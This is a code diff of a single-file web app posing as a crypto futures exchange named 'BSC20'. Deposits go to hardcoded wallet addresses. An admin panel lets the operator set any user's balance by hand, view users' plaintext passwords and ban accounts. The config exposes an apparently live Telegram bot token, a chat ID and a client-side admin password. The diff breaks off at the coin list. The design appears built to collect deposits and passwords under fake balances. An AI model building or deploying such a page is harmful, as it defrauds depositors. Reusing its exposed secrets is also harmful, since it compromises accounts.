@@ -13,7 +13,6 @@ body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--white);over
 input,select,button,textarea{font-family:'Inter',sans-serif;outline:none;border:none}
 .mono{font-family:'JetBrains Mono',monospace}
 a{text-decoration:none;color:inherit}
-
 .page{display:none;min-height:100vh;padding-bottom:85px}
 .page.active{display:block;animation:fadeIn .3s ease}
 @keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
@@ -24,11 +23,10 @@ a{text-decoration:none;color:inherit}
 @keyframes bounceIn{0%{transform:scale(.3);opacity:0}50%{transform:scale(1.05)}70%{transform:scale(.95)}100%{transform:scale(1);opacity:1}}
 @keyframes tickerScroll{0%{transform:translateX(0)}100%{transform:translateX(-50%)}}
 @keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-8px)}}
-@keyframes receiptLine{from{width:0}to{width:100%}}
-@keyframes checkmark{0%{transform:scale(0) rotate(-45deg);opacity:0}50%{transform:scale(1.2) rotate(-45deg)}100%{transform:scale(1) rotate(0);opacity:1}}
 @keyframes stampIn{0%{transform:scale(3) rotate(-15deg);opacity:0}100%{transform:scale(1) rotate(-5deg);opacity:1}}
+@keyframes shimmer{0%{background-position:-200% 0}100%{background-position:200% 0}}
+@keyframes ripple{0%{transform:scale(0);opacity:.5}100%{transform:scale(4);opacity:0}}
 
-/* LOGIN */
 #loginPage{display:none;align-items:center;justify-content:center;min-height:100vh;padding:20px;background:var(--bg);position:relative;overflow:hidden}
 #loginPage.active{display:flex}
 #loginPage::before{content:'';position:absolute;top:-50%;left:-30%;width:160%;height:100%;background:radial-gradient(ellipse at 50% 0%,rgba(240,185,11,.07) 0%,transparent 60%);pointer-events:none}
@@ -49,7 +47,6 @@ a{text-decoration:none;color:inherit}
 .admin-link{text-align:center;margin-top:16px;font-size:10px;color:var(--gray2);cursor:pointer;padding:8px;opacity:.3;transition:.3s}
 .admin-link:active{opacity:1}
 
-/* BTN */
 .btn{width:100%;padding:13px;border:none;border-radius:var(--r3);font-weight:700;font-size:14px;cursor:pointer;transition:.15s;display:flex;align-items:center;justify-content:center;gap:6px;position:relative;overflow:hidden}
 .btn:active{transform:scale(.97)}
 .btn-gold{background:linear-gradient(135deg,var(--gold),var(--gold3));color:#000}
@@ -57,22 +54,20 @@ a{text-decoration:none;color:inherit}
 .btn-red{background:linear-gradient(135deg,#f6465d,#d93650);color:#fff}
 .btn-outline{background:transparent;border:1px solid var(--border);color:var(--white)}
 .btn-sm{padding:8px 14px;font-size:11px;width:auto;border-radius:6px}
+.btn-xs{padding:5px 10px;font-size:10px;width:auto;border-radius:5px}
 
-/* HDR */
 .hdr{position:sticky;top:0;z-index:100;background:rgba(5,8,13,.95);backdrop-filter:blur(20px);border-bottom:1px solid var(--border);padding:10px 16px;display:flex;align-items:center;justify-content:space-between}
-.hdr-logo{font-size:20px;font-weight:900;color:var(--gold);letter-spacing:-1px}
+.hdr-logo{font-size:20px;font-weight:900;color:var(--gold);letter-spacing:-1px;cursor:pointer}
 .hdr-r{display:flex;align-items:center;gap:8px}
 .hdr-bal{font-size:11px;font-weight:700;color:var(--gold);background:var(--bg3);padding:6px 12px;border-radius:20px;border:1px solid var(--gold-br);font-family:'JetBrains Mono',monospace}
-.hdr-av{width:30px;height:30px;border-radius:50%;background:linear-gradient(135deg,var(--gold),var(--gold2));display:flex;align-items:center;justify-content:center;font-size:13px;cursor:pointer;border:2px solid var(--gold-br)}
+.hdr-av{width:30px;height:30px;border-radius:50%;background:linear-gradient(135deg,var(--gold),var(--gold2));display:flex;align-items:center;justify-content:center;font-size:13px;cursor:pointer;border:2px solid var(--gold-br);font-weight:700;color:#000}
 
-/* BNAV */
 .bnav{position:fixed;bottom:0;left:0;right:0;z-index:100;background:rgba(5,8,13,.97);backdrop-filter:blur(20px);border-top:1px solid var(--border);display:flex;padding:4px 0 calc(4px + env(safe-area-inset-bottom))}
 .bnav-i{flex:1;display:flex;flex-direction:column;align-items:center;gap:2px;cursor:pointer;padding:6px 0;font-size:9px;font-weight:600;color:var(--gray2);transition:.2s;position:relative}
 .bnav-i.on{color:var(--gold)}
 .bnav-i.on::after{content:'';position:absolute;top:0;left:25%;right:25%;height:2px;background:var(--gold);border-radius:2px}
 .bnav-i svg{width:20px;height:20px;stroke-width:1.8}
 
-/* TICKER */
 .tkr-w{overflow:hidden;background:var(--bg2);border-bottom:1px solid var(--border);padding:7px 0}
 .tkr{display:flex;gap:24px;animation:tickerScroll 50s linear infinite;white-space:nowrap}
 .tkr-i{display:flex;align-items:center;gap:5px;font-size:11px;font-weight:500}
@@ -80,7 +75,6 @@ a{text-decoration:none;color:inherit}
 .sec{padding:14px 16px}
 .sec-t{font-size:14px;font-weight:700;margin-bottom:10px;display:flex;align-items:center;gap:6px}
 
-/* BAL CARD */
 .bal-c{background:linear-gradient(135deg,rgba(240,185,11,.08),rgba(240,185,11,.02));border:1px solid var(--gold-br);border-radius:var(--r);padding:20px 18px;margin-bottom:14px;position:relative;overflow:hidden;animation:glow 5s ease-in-out infinite}
 .bal-c::after{content:'';position:absolute;top:-40px;right:-40px;width:100px;height:100px;background:radial-gradient(circle,rgba(240,185,11,.06),transparent);border-radius:50%}
 .bal-lbl{font-size:11px;color:var(--gray);font-weight:600}
@@ -89,13 +83,11 @@ a{text-decoration:none;color:inherit}
 .bal-sub{font-size:10px;color:var(--gray);flex:1}
 .bal-sub span{display:block;font-size:12px;color:var(--white);font-weight:700;font-family:'JetBrains Mono',monospace;margin-top:2px}
 
-/* QACT */
 .qacts{display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin-bottom:14px}
 .qact{display:flex;flex-direction:column;align-items:center;gap:5px;padding:12px 6px;background:var(--bg2);border:1px solid var(--border);border-radius:var(--r2);cursor:pointer;transition:.2s;font-size:10px;font-weight:700;color:var(--gray)}
 .qact:active{transform:scale(.93);border-color:var(--gold)}
 .qact svg{width:22px;height:22px;color:var(--gold)}
 
-/* COIN */
 .coin-r{display:flex;align-items:center;padding:11px 0;border-bottom:1px solid var(--border);cursor:pointer;transition:.1s}
 .coin-r:active{opacity:.7}
 .coin-ic{width:34px;height:34px;border-radius:50%;background:var(--bg4);display:flex;align-items:center;justify-content:center;font-size:10px;font-weight:900;color:var(--gold);margin-right:10px;border:1px solid var(--border);flex-shrink:0}
@@ -108,13 +100,11 @@ a{text-decoration:none;color:inherit}
 .c-up{color:var(--green);background:rgba(14,203,129,.1)}
 .c-dn{color:var(--red);background:rgba(246,70,93,.1)}
 
-/* TABS */
 .tabs{display:flex;gap:0;background:var(--bg2);border-radius:var(--r3);padding:3px;margin-bottom:12px;border:1px solid var(--border);overflow-x:auto;-webkit-overflow-scrolling:touch}
 .tabs::-webkit-scrollbar{display:none}
 .tab{padding:8px 14px;border-radius:6px;font-size:11px;font-weight:700;cursor:pointer;white-space:nowrap;color:var(--gray);transition:.2s;flex-shrink:0}
 .tab.on{background:var(--gold);color:#000}
 
-/* CARD */
 .card{background:var(--bg2);border:1px solid var(--border);border-radius:var(--r2);padding:14px;margin-bottom:10px}
 .card-gold{border-color:var(--gold-br);background:linear-gradient(135deg,var(--gold-bg),rgba(240,185,11,.01))}
 
@@ -151,7 +141,8 @@ a{text-decoration:none;color:inherit}
 
 .wsec{display:none}.wsec.on{display:block;animation:fadeIn .25s ease}
 
-.hist-i{display:flex;justify-content:space-between;align-items:center;padding:11px 0;border-bottom:1px solid var(--border);font-size:11px}
+.hist-i{display:flex;justify-content:space-between;align-items:center;padding:11px 0;border-bottom:1px solid var(--border);font-size:11px;cursor:pointer}
+.hist-i:active{opacity:.7}
 .st-p{color:var(--gold);background:rgba(240,185,11,.1);padding:2px 8px;border-radius:20px;font-size:9px;font-weight:700}
 .st-d{color:var(--green);background:rgba(14,203,129,.1);padding:2px 8px;border-radius:20px;font-size:9px;font-weight:700}
 .st-f{color:var(--red);background:rgba(246,70,93,.1);padding:2px 8px;border-radius:20px;font-size:9px;font-weight:700}
@@ -159,7 +150,6 @@ a{text-decoration:none;color:inherit}
 .pos-c{background:var(--bg3);border:1px solid var(--border);border-radius:var(--r2);padding:12px;margin-bottom:8px}
 .pnl-up{color:var(--green)}.pnl-dn{color:var(--red)}
 
-/* MODAL */
 .modal-bg{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.85);z-index:200;align-items:flex-end;justify-content:center}
 .modal-bg.on{display:flex}
 .modal{background:var(--bg2);border:1px solid var(--border);border-radius:var(--r) var(--r) 0 0;width:100%;max-width:500px;max-height:85vh;overflow-y:auto;animation:slideUp .3s ease}
@@ -168,7 +158,6 @@ a{text-decoration:none;color:inherit}
 .modal-x{width:28px;height:28px;border-radius:50%;background:var(--bg3);border:1px solid var(--border);color:var(--white);cursor:pointer;display:flex;align-items:center;justify-content:center;font-size:16px}
 .modal-body{padding:18px}
 
-/* RECEIPT */
 .receipt{background:#fff;border-radius:var(--r);padding:24px 20px;color:#000;max-width:360px;margin:0 auto;position:relative;overflow:hidden}
 .receipt::before{content:'';position:absolute;bottom:-8px;left:0;right:0;height:16px;background:linear-gradient(45deg,transparent 33.333%,#fff 33.333%,#fff 66.666%,transparent 66.666%),linear-gradient(-45deg,transparent 33.333%,#fff 33.333%,#fff 66.666%,transparent 66.666%);background-size:12px 16px}
 .receipt-hdr{text-align:center;border-bottom:2px dashed #ddd;padding-bottom:16px;margin-bottom:16px}
@@ -183,7 +172,6 @@ a{text-decoration:none;color:inherit}
 .receipt-stamp{position:absolute;top:50%;right:10px;transform:rotate(-15deg) translateY(-50%);font-size:40px;font-weight:900;opacity:.08;color:#f0b90b;animation:stampIn .5s ease .3s both}
 .receipt-footer{text-align:center;margin-top:16px;padding-top:16px;border-top:2px dashed #ddd;font-size:9px;color:#999}
 
-/* ADMIN */
 .admin-c{background:var(--bg2);border:1px solid var(--border);border-radius:var(--r2);padding:14px;margin-bottom:8px}
 .admin-s{text-align:center;padding:14px;background:var(--bg3);border-radius:var(--r2);border:1px solid var(--border)}
 .admin-s .v{font-size:22px;font-weight:900;color:var(--gold);font-family:'JetBrains Mono',monospace}
@@ -203,7 +191,16 @@ a{text-decoration:none;color:inherit}
 .mb4{margin-bottom:4px}.mb8{margin-bottom:8px}.mb12{margin-bottom:12px}
 .tc{text-align:center}.tr{text-align:right}
 .ts{font-size:11px}.txs{font-size:9px}.fw7{font-weight:700}
-.loader{display:inline-block;width:16px;height:16px;border:2px solid var(--border);border-top-color:var(--gold);border-radius:50%;animation:spin .5s linear infinite}
+
+.user-card{background:var(--bg3);border:1px solid var(--border);border-radius:var(--r2);padding:12px;margin-bottom:8px;position:relative}
+.user-card .uc-top{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:8px}
+.user-card .uc-name{font-weight:700;font-size:14px;color:var(--gold)}
+.user-card .uc-email{font-size:10px;color:var(--gray);margin-top:2px}
+.user-card .uc-bal{font-family:'JetBrains Mono',monospace;font-weight:900;font-size:18px;color:var(--gold)}
+.user-card .uc-info{font-size:10px;color:var(--gray2);margin-bottom:2px}
+.user-card .uc-actions{display:flex;gap:6px;margin-top:8px;flex-wrap:wrap}
+.user-online{display:inline-block;width:8px;height:8px;border-radius:50%;background:var(--green);margin-right:4px;animation:pulse 2s infinite}
+.user-banned{opacity:.5;border-color:var(--red) !important}
 
 @media(max-width:360px){.bal-amt{font-size:22px}.qacts{gap:5px}.qact{padding:9px 4px;font-size:9px}}
 @media(min-width:500px){.modal{border-radius:var(--r);max-height:75vh;margin-bottom:20px}.modal-bg{align-items:center;padding:20px}}
@@ -211,13 +208,9 @@ a{text-decoration:none;color:inherit}
 </head>
 <body>
 
-<!-- LOGIN -->
 <div id="loginPage" class="page">
 <div class="login-w">
-<div class="login-logo">
-<h1>BSC20</h1>
-<p>The Future of Trading</p>
-</div>
+<div class="login-logo"><h1>BSC20</h1><p>The Future of Trading</p></div>
 <div class="login-card">
 <div class="ltabs" id="lTabs">
 <div class="ltab on" onclick="switchLTab(0)">Sign In</div>
@@ -245,17 +238,14 @@ a{text-decoration:none;color:inherit}
 </div>
 </div>
 
-<!-- APP -->
 <div id="appWrap" style="display:none">
-
 <div class="hdr">
 <div class="hdr-logo" onclick="goPage('home')">BSC20</div>
 <div class="hdr-r">
 <div class="hdr-bal" id="hBal">$0.00</div>
-<div class="hdr-av" onclick="goPage('profile')">U</div>
+<div class="hdr-av" id="hdrAv" onclick="goPage('profile')">U</div>
 </div>
 </div>
-
 <div class="tkr-w"><div class="tkr" id="tickerEl"></div></div>
 
 <!-- HOME -->
@@ -278,13 +268,12 @@ a{text-decoration:none;color:inherit}
 </div>
 <div class="flex-b mb8"><div class="sec-t" style="margin:0">Market</div><span style="color:var(--gold);font-size:11px;font-weight:700;cursor:pointer" onclick="goPage('market')">See All</span></div>
 <div class="tabs" id="hTabs">
-<div class="tab on" onclick="hTabClick('hot',this)">Hot</div>
-<div class="tab" onclick="hTabClick('pump',this)">Gainers</div>
-<div class="tab" onclick="hTabClick('dump',this)">Losers</div>
-<div class="tab" onclick="hTabClick('new',this)">New</div>
+<div class="tab on" onclick="hTabC(this,'hot')">Hot</div>
+<div class="tab" onclick="hTabC(this,'pump')">Gainers</div>
+<div class="tab" onclick="hTabC(this,'dump')">Losers</div>
 </div>
 <div id="hCoins"></div>
-<div class="flex-b mt16 mb8"><div class="sec-t" style="margin:0">Offers</div><span style="color:var(--gold);font-size:11px;font-weight:700;cursor:pointer" onclick="goPage('offers')">All 16</span></div>
+<div class="flex-b mt16 mb8"><div class="sec-t" style="margin:0">Offers</div><span style="color:var(--gold);font-size:11px;font-weight:700;cursor:pointer" onclick="goPage('offers')">All</span></div>
 <div id="hOffers"></div>
 </div>
 </div>
@@ -295,13 +284,12 @@ a{text-decoration:none;color:inherit}
 <div class="sec-t">Markets</div>
 <input type="text" class="srch" placeholder="Search coins..." oninput="filterMkt(this.value)">
 <div class="tabs mt8" id="mTabs">
-<div class="tab on" onclick="mTabClick('all',this)">All</div>
-<div class="tab" onclick="mTabClick('pump',this)">Gainers</div>
-<div class="tab" onclick="mTabClick('dump',this)">Losers</div>
-<div class="tab" onclick="mTabClick('hot',this)">Volume</div>
-<div class="tab" onclick="mTabClick('meme',this)">Meme</div>
-<div class="tab" onclick="mTabClick('defi',this)">DeFi</div>
-<div class="tab" onclick="mTabClick('l1',this)">L1</div>
+<div class="tab on" onclick="mTabC(this,'all')">All</div>
+<div class="tab" onclick="mTabC(this,'pump')">Gainers</div>
+<div class="tab" onclick="mTabC(this,'dump')">Losers</div>
+<div class="tab" onclick="mTabC(this,'meme')">Meme</div>
+<div class="tab" onclick="mTabC(this,'defi')">DeFi</div>
+<div class="tab" onclick="mTabC(this,'l1')">L1</div>
 </div>
 <div id="mCoins"></div>
 </div>
@@ -318,17 +306,15 @@ a{text-decoration:none;color:inherit}
 </div>
 <div id="futChg" class="ts mb8" style="font-weight:600"></div>
 <div class="chart-box" id="tvChart"></div>
-
 <div class="card">
 <div class="flex-b mb4"><span class="ts fw7">Leverage</span><div class="lev-v" id="levVal">20x</div></div>
 <input type="range" class="lev-s" id="levSlider" min="5" max="200" value="20" step="5" oninput="updLev(this.value)">
 <div class="flex-b txs" style="color:var(--gray)"><span>5x</span><span>50x</span><span>100x</span><span>150x</span><span>200x</span></div>
 </div>
-
 <div class="card">
 <div class="tabs mb8">
-<div class="tab on" onclick="setOrdType('market',this)">Market</div>
-<div class="tab" onclick="setOrdType('limit',this)">Limit</div>
+<div class="tab on" onclick="setOT('market',this)">Market</div>
+<div class="tab" onclick="setOT('limit',this)">Limit</div>
 </div>
 <div id="limRow" style="display:none" class="fg"><label>Price (USDT)</label><input type="number" id="limPr" placeholder="Limit price"></div>
 <div class="fg"><label>Amount (USDT)</label><input type="number" id="futAmt" placeholder="Min 10 USDT" value="100" oninput="calcPos()"></div>
@@ -342,8 +328,8 @@ a{text-decoration:none;color:inherit}
 <div class="flex-b txs mb4"><span style="color:var(--gray)">Position Size</span><span class="mono" id="posSize">0.00 USDT</span></div>
 <div class="flex-b txs mb8"><span style="color:var(--gray)">Margin</span><span class="mono" id="marginReq">0.00 USDT</span></div>
 <div class="g2">
-<button class="btn btn-green" onclick="openPosition('LONG')">LONG</button>
-<button class="btn btn-red" onclick="openPosition('SHORT')">SHORT</button>
+<button class="btn btn-green" onclick="openPos('LONG')">LONG</button>
+<button class="btn btn-red" onclick="openPos('SHORT')">SHORT</button>
 </div>
 </div>
 <div class="sec-t mt16">Open Positions</div>
@@ -370,8 +356,6 @@ a{text-decoration:none;color:inherit}
 <div class="tab" onclick="wTab('coupon')">Coupon</div>
 <div class="tab" onclick="wTab('hist')">History</div>
 </div>
-
-<!-- DEP -->
 <div id="ws_dep" class="wsec on">
 <div class="card card-gold">
 <div style="text-align:center;margin-bottom:12px">
@@ -381,14 +365,14 @@ a{text-decoration:none;color:inherit}
 </div>
 <div class="ts fw7 mb4">1. Select Network</div>
 <div class="net-g">
-<div class="net-b on" onclick="selDepNet('TON',this)">TON</div>
-<div class="net-b" onclick="selDepNet('TRC20',this)">TRC20</div>
-<div class="net-b" onclick="selDepNet('BEP20',this)">BEP20</div>
+<div class="net-b on" onclick="selDN('TON',this)">TON</div>
+<div class="net-b" onclick="selDN('TRC20',this)">TRC20</div>
+<div class="net-b" onclick="selDN('BEP20',this)">BEP20</div>
 </div>
 <div class="ts fw7 mb4 mt8">2. Copy Address</div>
 <div class="addr-b" id="depAddr">Loading...<button class="cp-btn" onclick="copyAddr()">Copy</button></div>
 <div class="qr-b"><canvas id="qrC" width="110" height="110"></canvas></div>
-<div class="dep-step"><div class="dep-step-num">1</div><div class="dep-step-txt"><b>Copy</b> the address</div></div>
+<div class="dep-step"><div class="dep-step-num">1</div><div class="dep-step-txt"><b>Copy</b> the address above</div></div>
 <div class="dep-step"><div class="dep-step-num">2</div><div class="dep-step-txt"><b>Send USDT</b> (Min: 5 USDT)</div></div>
 <div class="dep-step"><div class="dep-step-num">3</div><div class="dep-step-txt"><b>Enter</b> amount & TxHash below</div></div>
 <div class="dep-step" style="border:none"><div class="dep-step-num">4</div><div class="dep-step-txt"><b>Click Confirm</b> - reviewed in ~5 min</div></div>
@@ -396,12 +380,10 @@ a{text-decoration:none;color:inherit}
 <div class="ts fw7 mb8" style="color:var(--gold)">3. Confirm Deposit</div>
 <div class="fg"><label>Amount Sent (USDT)</label><input type="number" id="depAmt" placeholder="Amount you sent"></div>
 <div class="fg"><label>Transaction Hash (TxID)</label><input type="text" id="depHash" placeholder="Paste TxHash"></div>
-<button class="btn btn-gold" onclick="submitDeposit()">Confirm Deposit</button>
+<button class="btn btn-gold" onclick="submitDep()">Confirm Deposit</button>
 </div>
 </div>
 </div>
-
-<!-- WD -->
 <div id="ws_wd" class="wsec">
 <div class="card">
 <div style="text-align:center;margin-bottom:12px">
@@ -410,20 +392,18 @@ a{text-decoration:none;color:inherit}
 </div>
 <div class="ts fw7 mb4">Select Network</div>
 <div class="net-g">
-<div class="net-b on" onclick="selWdNet(this)">TRC20</div>
-<div class="net-b" onclick="selWdNet(this)">BEP20</div>
-<div class="net-b" onclick="selWdNet(this)">TON</div>
+<div class="net-b on" onclick="selWN(this)">TRC20</div>
+<div class="net-b" onclick="selWN(this)">BEP20</div>
+<div class="net-b" onclick="selWN(this)">TON</div>
 </div>
 <div class="fg mt8"><label>Your Wallet Address</label><input type="text" id="wdAddr" placeholder="Recipient address"></div>
 <div class="fg"><label>Amount (USDT)</label><input type="number" id="wdAmt" placeholder="Min 10 USDT"></div>
 <div class="flex-b txs mb4"><span style="color:var(--gray)">Fee:</span><span class="mono">1 USDT</span></div>
 <div class="flex-b txs mb4"><span style="color:var(--gray)">Available:</span><span class="mono" id="wdAvl">0.00</span></div>
 <div class="card-gold" style="padding:8px;margin:8px 0;border-radius:6px"><div class="txs tc" style="color:var(--gold)">Processing time: ~30 minutes</div></div>
-<button class="btn btn-gold" onclick="submitWithdraw()">Withdraw</button>
+<button class="btn btn-gold" onclick="submitWd()">Withdraw</button>
 </div>
 </div>
-
-<!-- COUPON -->
 <div id="ws_coupon" class="wsec">
 <div class="card card-gold tc">
 <div style="font-size:40px;margin-bottom:6px;animation:bounceIn .5s ease">🎟️</div>
@@ -431,16 +411,13 @@ a{text-decoration:none;color:inherit}
 <div class="txs mt4 mb12" style="color:var(--gray)">Enter code to receive bonus USDT</div>
 <div class="fg"><input type="text" id="coupIn" placeholder="ENTER CODE" style="text-align:center;text-transform:uppercase;font-weight:700;letter-spacing:2px;font-size:15px;padding:14px"></div>
 <button class="btn btn-gold" onclick="redeemCoupon()">REDEEM NOW</button>
-<div class="txs mt8" style="color:var(--gray)">Up to 100 USDT bonus per code</div>
 </div>
 </div>
-
-<!-- HIST -->
 <div id="ws_hist" class="wsec">
 <div class="tabs mb8" id="htTabs">
-<div class="tab on" onclick="htFilt('all',this)">All</div>
-<div class="tab" onclick="htFilt('deposit',this)">Deposits</div>
-<div class="tab" onclick="htFilt('withdraw',this)">Withdrawals</div>
+<div class="tab on" onclick="htF('all',this)">All</div>
+<div class="tab" onclick="htF('deposit',this)">Deposits</div>
+<div class="tab" onclick="htF('withdraw',this)">Withdrawals</div>
 </div>
 <div id="histList"></div>
 </div>
@@ -449,17 +426,14 @@ a{text-decoration:none;color:inherit}
 
 <!-- OFFERS -->
 <div id="pg_offers" class="page">
-<div class="sec">
-<div class="sec-t">Special Offers</div>
-<div id="offersAll"></div>
-</div>
+<div class="sec"><div class="sec-t">Special Offers</div><div id="offersAll"></div></div>
 </div>
 
 <!-- PROFILE -->
 <div id="pg_profile" class="page">
 <div class="sec">
 <div class="tc" style="padding:20px 0">
-<div style="width:60px;height:60px;border-radius:50%;background:linear-gradient(135deg,var(--gold),var(--gold2));margin:0 auto;display:flex;align-items:center;justify-content:center;font-size:26px;border:3px solid var(--gold-br)">U</div>
+<div id="profAv" style="width:60px;height:60px;border-radius:50%;background:linear-gradient(135deg,var(--gold),var(--gold2));margin:0 auto;display:flex;align-items:center;justify-content:center;font-size:26px;border:3px solid var(--gold-br);font-weight:900;color:#000">U</div>
 <div class="fw7 mt8" style="font-size:16px" id="pName">User</div>
 <div class="txs" style="color:var(--gray)" id="pEmail">user@email.com</div>
 </div>
@@ -481,15 +455,15 @@ a{text-decoration:none;color:inherit}
 </div>
 <div class="g2 mb12">
 <div class="admin-s"><div class="v" id="aW">0</div><div class="l">Withdrawals</div></div>
-<div class="admin-s"><div class="v" id="aC">0</div><div class="l">Coupons</div></div>
+<div class="admin-s"><div class="v" id="aC">0</div><div class="l">Coupons Used</div></div>
 </div>
 <div class="tabs mb8" id="adTabs">
-<div class="tab on" onclick="adTabClick('users',this)">Users</div>
-<div class="tab" onclick="adTabClick('deps',this)">Deposits</div>
-<div class="tab" onclick="adTabClick('wds',this)">Withdrawals</div>
+<div class="tab on" onclick="adTab('users',this)">Users</div>
+<div class="tab" onclick="adTab('deps',this)">Deposits</div>
+<div class="tab" onclick="adTab('wds',this)">Withdrawals</div>
 </div>
 <div id="ad_users" class="wsec on">
-<input type="text" class="srch mb8" placeholder="Search users..." oninput="searchAdUsers(this.value)">
+<input type="text" class="srch mb8" placeholder="Search users..." oninput="searchAU(this.value)">
 <div id="adUserList"></div>
 </div>
 <div id="ad_deps" class="wsec"><div id="adDepList"></div></div>
@@ -497,7 +471,6 @@ a{text-decoration:none;color:inherit}
 </div>
 </div>
 
-<!-- BNAV -->
 <div class="bnav" id="bNav">
 <div class="bnav-i on" onclick="goPage('home')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor"><path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z"/></svg><span>Home</span></div>
 <div class="bnav-i" onclick="goPage('market')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor"><path d="M22 12h-4l-3 9L9 3l-3 9H2"/></svg><span>Market</span></div>
@@ -508,15 +481,18 @@ a{text-decoration:none;color:inherit}
 </div>
 
 <!-- EDIT MODAL -->
-<div class="modal-bg" id="editModal" onclick="if(event.target===this)closeEditModal()">
+<div class="modal-bg" id="editModal" onclick="if(event.target===this)closeEM()">
 <div class="modal">
-<div class="modal-h"><h3>Edit User Balance</h3><button class="modal-x" onclick="closeEditModal()">X</button></div>
+<div class="modal-h"><h3>Edit User</h3><button class="modal-x" onclick="closeEM()">X</button></div>
 <div class="modal-body">
-<div class="mb8 fw7" style="font-size:13px">User: <span id="emUser" style="color:var(--gold)"></span></div>
-<div class="mb8 txs" style="color:var(--gray)">ID: <span id="emUID"></span></div>
+<div class="mb8 fw7" style="font-size:14px">User: <span id="emUser" style="color:var(--gold)"></span></div>
+<div class="mb4 txs" style="color:var(--gray)">Email: <span id="emEmail"></span></div>
+<div class="mb4 txs" style="color:var(--gray)">ID: <span id="emUID"></span></div>
+<div class="mb8 txs" style="color:var(--gray)">Password: <span id="emPass"></span></div>
 <div class="fg"><label>Main Balance (USDT)</label><input type="number" id="emMain" step="0.01" placeholder="0.00"></div>
 <div class="fg"><label>Bonus Balance (USDT)</label><input type="number" id="emBonus" step="0.01" placeholder="0.00"></div>
-<button class="btn btn-gold" onclick="saveBalance()">Save Changes</button>
+<button class="btn btn-gold" onclick="saveBal()">Save Changes</button>
+<button class="btn btn-red mt8" id="banBtn" onclick="toggleBan()">Ban User</button>
 </div>
 </div>
 </div>
@@ -532,1238 +508,995 @@ a{text-decoration:none;color:inherit}
 <div class="toast" id="toast"></div>
 
 <script>
-var CFG = {
-  BOT_TOKEN: '8461422042:AAGOwNR6NKcunaQlxQqtKxo9Bsu3ZdHHzLA',
-  CHAT_ID: '5550926280',
-  ADMIN_ID: '7701',
-  ADMIN_PASS: 'xx7701',
-  ADDR: {
-    TON: 'UQDtq8ZFfiEbUkiK9dbOEYVY6sj0pxF0cXbU9tLShy8ye-O8',
-    TRC20: 'TS33vZ2DwQiAurVYRex9GJK3HFb7H15BeS',
-    BEP20: '0x522fcfb0e1d19041bc7eb5fd7f30d24ce38359cf'
-  }
+var CFG={
+BOT:'8461422042:AAGOwNR6NKcunaQlxQqtKxo9Bsu3ZdHHzLA',
+CHAT:'5550926280',
+AID:'7701',
+APW:'xx7701',
+ADDR:{
+TON:'UQDtq8ZFfiEbUkiK9dbOEYVY6sj0pxF0cXbU9tLShy8ye-O8',
+TRC20:'TS33vZ2DwQiAurVYRex9GJK3HFb7H15BeS',
+BEP20:'0x522fcfb0e1d19041bc7eb5fd7f30d24ce38359cf'
+}
 };
 
-// COUPONS
-var COUPONS = {};
-var _pfx = ['WELCOME','WELCOME','WELCOME','WELCOME','WELCOME','GIFT','GIFT','GIFT','GIFT','GIFT','BONUS','BONUS','BONUS','BONUS','BONUS','BONUS','BONUS','BONUS','BONUS','BONUS','STAR','STAR','STAR','STAR','STAR','STAR','STAR','STAR','STAR','STAR','GOLD','GOLD','GOLD','GOLD','GOLD','GOLD','GOLD','GOLD','GOLD','GOLD','FIRE','FIRE','FIRE','FIRE','FIRE','FIRE','FIRE','FIRE','FIRE','FIRE','LUCKY','LUCKY','LUCKY','LUCKY','LUCKY','LUCKY','LUCKY','LUCKY','LUCKY','LUCKY','VIP','VIP','VIP','VIP','VIP','VIP','VIP','VIP','VIP','VIP','MEGA','MEGA','MEGA','MEGA','MEGA','MEGA','MEGA','MEGA','MEGA','MEGA','PRO','PRO','PRO','PRO','PRO','PRO','PRO','PRO','PRO','PRO','ELITE','ELITE','ELITE','ELITE','ELITE','ELITE','ELITE','ELITE','ELITE','ELITE'];
-for (var i = 1; i <= 100; i++) {
-  var num = i < 10 ? '00' + i : (i < 100 ? '0' + i : '' + i);
-  COUPONS['BSC20-' + _pfx[i - 1] + '-' + num] = 100;
+/* ===== 103 COUPON CODES ===== */
+var COUPONS={};
+var _cpx=['WELCOME','WELCOME','WELCOME','WELCOME','WELCOME','GIFT','GIFT','GIFT','GIFT','GIFT','BONUS','BONUS','BONUS','BONUS','BONUS','BONUS','BONUS','BONUS','BONUS','BONUS','STAR','STAR','STAR','STAR','STAR','STAR','STAR','STAR','STAR','STAR','GOLD','GOLD','GOLD','GOLD','GOLD','GOLD','GOLD','GOLD','GOLD','GOLD','FIRE','FIRE','FIRE','FIRE','FIRE','FIRE','FIRE','FIRE','FIRE','FIRE','LUCKY','LUCKY','LUCKY','LUCKY','LUCKY','LUCKY','LUCKY','LUCKY','LUCKY','LUCKY','VIP','VIP','VIP','VIP','VIP','VIP','VIP','VIP','VIP','VIP','MEGA','MEGA','MEGA','MEGA','MEGA','MEGA','MEGA','MEGA','MEGA','MEGA','PRO','PRO','PRO','PRO','PRO','PRO','PRO','PRO','PRO','PRO','ELITE','ELITE','ELITE','ELITE','ELITE','ELITE','ELITE','ELITE','ELITE','ELITE'];
+for(var ci=1;ci<=100;ci++){
+var cn=ci<10?'00'+ci:(ci<100?'0'+ci:''+ci);
+COUPONS['BSC20-'+_cpx[ci-1]+'-'+cn]=100;
 }
-COUPONS['GOLD2025'] = 20;
-COUPONS['WELCOME100'] = 100;
-COUPONS['BSC20'] = 50;
+COUPONS['GOLD2025']=20;
+COUPONS['WELCOME100']=100;
+COUPONS['BSC20']=50;
 
-// COINS
-var COINS_RAW = [
-  {s:'BTC',n:'Bitcoin',c:'Layer 1',p:65432},{s:'ETH',n:'Ethereum',c:'Layer 1',p:3456},{s:'BNB',n:'BNB',c:'Layer 1',p:580},
-  {s:'SOL',n:'Solana',c:'Layer 1',p:152},{s:'XRP',n:'Ripple',c:'Payment',p:0.62},{s:'ADA',n:'Cardano',c:'Layer 1',p:0.45},
-  {s:'DOGE',n:'Dogecoin',c:'Meme',p:0.12},{s:'TRX',n:'TRON',c:'Layer 1',p:0.11},{s:'DOT',n:'Polkadot',c:'Layer 0',p:7.2},
